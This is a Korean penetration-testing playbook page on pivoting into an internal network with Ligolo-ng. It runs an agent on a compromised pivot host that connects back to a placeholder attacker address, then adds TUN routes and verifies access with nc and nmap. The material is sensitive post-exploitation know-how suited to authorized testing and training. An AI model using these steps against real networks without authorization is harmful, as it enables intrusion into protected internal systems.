---
tags:
  - 환경/linux
  - 환경/windows
시작조건: ["피벗 호스트 셸 또는 원격 명령 실행 확보", "피벗 호스트에서 <INTERNAL_IP>:<PORT> TCP 연결 가능", "피벗 뒤 <INTERNAL_CIDR> 확인"]
필요권한: ["피벗 호스트의 현재 계정으로 agent 실행 가능", "운영 호스트에서 TUN 인터페이스와 route를 만들 관리자/root 권한"]
필요조건: ["피벗 호스트에서 <ATTACKER_IP>:11601/TCP로 agent 연결 가능", "피벗 호스트에서 <INTERNAL_IP>:<PORT> 연결 가능", "피벗 뒤 <INTERNAL_CIDR>"]
결과: ["운영 호스트의 <INTERNAL_CIDR> route", "운영 호스트에서 <INTERNAL_IP>:<PORT>까지의 TCP 경로"]
---

# TUN 라우팅 피벗 구성

## 한 줄 판단

피벗 호스트에서 `<INTERNAL_IP>:<PORT>`에 연결할 수 있고 `<ATTACKER_IP>:11601`로 agent를 연결할 수 있으면, 운영 호스트에 TUN interface와 `<INTERNAL_CIDR>` route를 만들어 일반 TCP 도구가 내부 주소에 직접 도달하게 한다.

## 사용할 때

- 현재 네트워크 위치: 운영 호스트에서는 `<INTERNAL_IP>:<PORT>`에 직접 연결할 수 없지만, 셸 또는 원격 명령 실행을 보유한 피벗 호스트에서는 해당 내부 TCP 포트에 연결할 수 있다.
- 명령 실행 위치: Ligolo-ng `proxy`, interface·route 구성과 최종 클라이언트는 운영 호스트에서 실행하고, `agent`는 피벗 호스트의 현재 세션에서 실행한다.
- 보유 계정·피벗 세션: 피벗 호스트의 유지 중인 셸 또는 원격 명령 실행이 필요하다. agent 제어 채널에는 내부 서비스용 계정이나 Kerberos ticket을 전달하지 않는다.
- 현재 권한: 피벗 호스트에서는 현재 계정으로 agent를 실행할 수 있으면 되고, 운영 호스트에서는 TUN interface와 route를 만들 관리자/root 권한이 필요하다.
- 지금 가능한 행동: `<INTERNAL_CIDR>`의 여러 호스트·TCP 포트를 ProxyChains 없이 일반 클라이언트로 확인한다.
- 성공 범위: 운영 호스트에서 `<INTERNAL_IP>:<PORT>`의 TCP 응답이나 로그인 단계까지 도달한다. agent 연결은 경로 구성일 뿐이며 서비스 인증, 원격 명령 실행과 관리자 권한은 별도로 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 피벗 호스트→`<ATTACKER_IP>:11601`과 피벗 호스트→`<INTERNAL_IP>:<PORT>` TCP 연결 가능 | 피벗 호스트에서 두 목적 포트를 각각 확인 | proxy 바인딩·egress 방화벽과 내부 route·대상 방화벽을 분리 확인 |
| 현재 계정 또는 인증 수단 | 피벗 호스트의 유지 중인 셸 또는 원격 명령 실행 | `whoami` 또는 `id`, `hostname` | 세션 재연결과 agent 파일 전송 경로 확인 |
| 현재 권한 | 피벗 계정으로 agent 실행, 운영 호스트에서 TUN·route 생성 가능 | agent 실행 오류와 운영 호스트 권한 확인 | agent 실행 권한·아키텍처와 운영 호스트의 관리자/root 권한 확인 |
| 공격 대상의 조건 | 피벗 호스트가 `<INTERNAL_CIDR>` route를 가지고 `<INTERNAL_IP>:<PORT>`에 연결 가능 | `ip route` 또는 `route print`, `nc -vz <INTERNAL_IP> <PORT>` | CIDR·gateway·DNS·방화벽과 대상 listener 확인 |
| 필요한 파일·목록·주소 | proxy·agent, `<ATTACKER_IP>`, `<INTERNAL_CIDR>`, `<INTERNAL_IP>`, `<PORT>` | 양쪽 바이너리와 각 인터페이스 주소 확인 | OS·아키텍처에 맞는 파일과 올바른 VPN·내부 주소로 교체 |

## 실행

1. [[피벗팅 경로 식별과 내부망 열거]]로 필요한 최소 홉과 `<INTERNAL_CIDR>`을 확정하고, 피벗 호스트에서 `<INTERNAL_IP>:<PORT>` 기준선을 확인한다.
2. 운영 호스트에서 Ligolo-ng proxy를 실행해 `<ATTACKER_IP>:11601` listener를 시작한다.
3. 피벗 호스트에서 agent를 실행해 proxy에 연결한다.
4. proxy 전역 프롬프트에서 TUN interface와 내부 CIDR route를 만든 뒤 올바른 피벗 session을 선택해 터널을 활성화한다.
5. 운영 호스트에서 단일 TCP 연결을 먼저 확인한 뒤 서비스별 도구를 실행한다.
6. 서비스에 인증하거나 세션을 열었으면 최종 대상의 Identity와 실제 권한을 별도로 확인한다.

### proxy와 agent 연결

```bash
sudo ./proxy -selfcert
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
```

확인할 출력:

- 운영 호스트 proxy의 `<ATTACKER_IP>:11601` listener 주소와 포트.
- agent의 `Connection established`.
- proxy 콘솔의 `Agent joined`.

### session과 route 활성화

```text
ligolo-ng » interface_create --name ligolo
ligolo-ng » interface_add_route --name ligolo --route <INTERNAL_CIDR>
ligolo-ng » session
[Agent : <AGENT>] » tunnel_start --tun ligolo
```

확인할 출력:

- 올바른 agent session이 선택됨.
- `Interface created!`, `Route created.`와 tunnel 시작 메시지가 출력됨.

### 운영 호스트에서 최종 연결 확인

```bash
nc -vz <INTERNAL_IP> <PORT>
nmap -sT -Pn -n -p<PORT> <INTERNAL_IP>
```

확인할 출력:

- `nc -vz`가 목표 TCP 포트 연결 성공을 반환함.
- Nmap의 TCP connect scan과 실제 서비스 클라이언트가 같은 경로로 응답함.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Agent joined`가 보임 | 피벗 호스트 agent와 운영 호스트 proxy의 제어 채널이 연결됨 | 피벗 agent session 확보 | 올바른 내부 CIDR route 추가 |
| route와 tunnel이 생성되고 운영 호스트의 `nc -vz <INTERNAL_IP> <PORT>`가 성공함 | TUN 경유 TCP 경로가 동작함 | 운영 호스트에서 내부 서비스 접근 | 서비스 문서에서 인증·후속 기법 선택 |
| agent는 연결되지만 최종 TCP가 실패함 | 내부 CIDR, route 또는 tunnel 선택이 잘못됐을 수 있음 | 제어 채널만 확보 | 피벗 호스트 기준선과 운영 호스트 route 비교 |
| 피벗 호스트의 기준선부터 실패함 | 터널보다 앞선 내부 도달성 문제 | 피벗 경로 미확정 | 대상 포트, 방화벽, 다음 홉과 내부 CIDR 재확인 |
| `nc`는 성공하지만 특정 도구만 실패함 | TUN 경로보다 최종 클라이언트·DNS·프로토콜 문제일 가능성이 큼 | TCP 경로 확보 | FQDN, 내부 DNS, 시간과 도구별 옵션 확인 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 피벗 기준선 | 피벗 호스트의 `nc -vz` | 내부 서비스 도달성과 터널 문제를 분리 |
| 제어 채널 | `Connection established`, `Agent joined` | agent 실행 권한만 확인하며 내부 route 성공과 구분 |
| TUN과 route | 운영 호스트의 interface·route와 tunnel 상태 | TUN 생성 권한과 대상 CIDR을 확인 |
| 최종 접근 | 운영 호스트의 `nc`, 서비스 클라이언트 응답 | TCP 경로, 서비스 인증과 애플리케이션 권한을 구분 |

## 변경 영향과 복구

터널을 종료한 뒤 운영 호스트에 만든 route와 TUN interface를 제거한다. 관리형 interface 삭제 명령은 Ligolo-ng 버전별 `help`에서 확인하고, 수동으로 만든 Linux interface는 아래처럼 정리한다.

```bash
sudo ip route del <INTERNAL_CIDR> dev ligolo
sudo ip link delete ligolo
ip route show <INTERNAL_CIDR>
ip link show ligolo
```

확인할 출력:

- 내부 CIDR route와 `ligolo` interface가 더 이상 표시되지 않는다.
- 여러 tunnel이 같은 interface를 사용 중이면 해당 session을 먼저 종료하고 공유 route를 삭제하지 않는다.

## 관련 도구

- [[ligolo-ng]]
- [[netcat]]
- [[nmap]]

## 관련 상태 라우터

- [[내부망 경로 확보 후 피벗 구성]]
